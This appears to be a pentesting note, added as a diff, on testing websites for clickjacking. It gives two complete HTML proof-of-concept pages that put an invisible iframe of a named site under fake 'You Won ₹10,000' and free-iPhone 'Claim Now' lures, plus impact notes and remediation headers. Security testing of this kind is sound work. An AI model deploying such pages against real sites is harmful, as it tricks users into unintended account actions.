@@ -1,0 +1,213 @@
+Clickjacking is a web security vulnerability where an attacker tricks a user into clicking on something different from what the user thinks they are clicking,This is usually done by overlaying a transparent or hidden iframe over a legitimate webpage
+
+
+                                                                                 
+                                                                                  Clickjacking – Automatic Testing Tool
+
+Clickjacker.io is an online automatic tool used to check whether a website is vulnerable to Clickjacking.
+
+How to Use :
+Open https://clickjacker.io/ or https://clickjacking.m14r41.in/
+Enter the target website URL
+Run the test
+
+Review the result:
+Vulnerable → Site loads inside iframe
+Not Vulnerable → Framing is blocked
+
+
+                                                                                Clickjacking – Manual Testing Using HTML File
+
+1.Create an HTML file (e.g., clickjack.html)
+
+<<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Reward Popup</title>
+<style>
+    body {
+        margin: 0;
+        font-family: Arial, sans-serif;
+    }
+
+    /* Full background iframe (visible site) */
+    iframe.bg {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        border: none;
+        z-index: 1;
+    }
+
+    /* Small popup box */
+    .popup {
+        position: fixed;
+        top: 30%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        width: 300px;
+        padding: 20px;
+        background: white;
+        text-align: center;
+        border-radius: 10px;
+        box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+        z-index: 3;
+    }
+
+    .popup h3 {
+        margin-bottom: 10px;
+        color: green;
+    }
+
+    .btn {
+        background: #ff5722;
+        color: white;
+        padding: 10px 15px;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+    }
+
+    /* Invisible attack iframe aligned to button */
+    iframe.attack {
+        position: fixed;
+        top: 38%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        width: 150px;
+        height: 50px;
+        opacity: 0.01;
+        z-index: 2;
+        border: none;
+    }
+</style>
+</head>
+
+<body>
+
+<!-- Background real website -->
+<iframe class="bg" src="https://app.uat.sniffrai.com"></iframe>
+
+<!-- Invisible attack layer -->
+<iframe class="attack" src="https://app.uat.sniffrai.com"></iframe>
+
+<!-- Fake popup -->
+<div class="popup">
+    <h3>🎉 You Won ₹10,000</h3>
+    <p>Click below to claim</p>
+    <button class="btn">Claim Now</button>
+</div>
+
+</body>
+</html>
+
+
+
+                                                                                           [ OR ] 
+
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>iPhone Giveaway</title>
+  <style>
+    body {
+      background: linear-gradient(to right, #000428, #004e92);
+      font-family: Arial;
+      text-align: center;
+      color: white;
+    }
+
+    .box {
+      position: relative;
+      width: 500px;
+      height: 350px;
+      margin: 80px auto;
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: 0 0 20px rgba(0,0,0,0.5);
+      background: #000;
+    }
+
+    iframe {
+      width: 100%;
+      height: 100%;
+      border: none;
+      opacity: 0.85; /* 👈 visible but slightly faded */
+      position: absolute;
+      top: 0;
+      left: 0;
+      z-index: 1;
+    }
+
+    .overlay {
+      position: absolute;
+      z-index: 2;
+      bottom: 20px;
+      width: 100%;
+      text-align: center;
+    }
+
+    .btn {
+      padding: 14px 30px;
+      background: rgba(255, 0, 0, 0.85);
+      color: white;
+      font-size: 18px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    h2 {
+      margin-top: 40px;
+    }
+  </style>
+</head>
+<body>
+
+<h2>🎁 Claim Your Free iPhone 🎁</h2>
+
+<div class="box">
+
+  <!-- Target Website -->
+  <iframe src="https://app.mrprobe.dev/"></iframe>
+
+  <!-- Fake Button -->
+  <div class="overlay">
+    <button class="btn">Claim Now</button>
+  </div>
+
+</div>
+
+</body>
+</html>
+
+
+2.Open the HTML file in a browser
+
+3.If the target website loads inside the iframe, it means the website does not block framing,This confirms the website is vulnerable to Clickjacking
+
+
+
+
+
+                                                                                             Impact
+
+
+If a Clickjacking vulnerability exists, an attacker can:
+Trick users into performing unintended actions
+Change account settings
+Trigger financial or sensitive operations
+Enable or disable features without user awareness
+Combine with CSRF for account takeover
+
+
+
+                                                                                          Remediation
+
+
+✅ Implement X-Frame-Options header: X-Frame-Options: DENY
+✅ Or use Content-Security-Policy (CSP): Content-Security-Policy: frame-ancestors 'none';
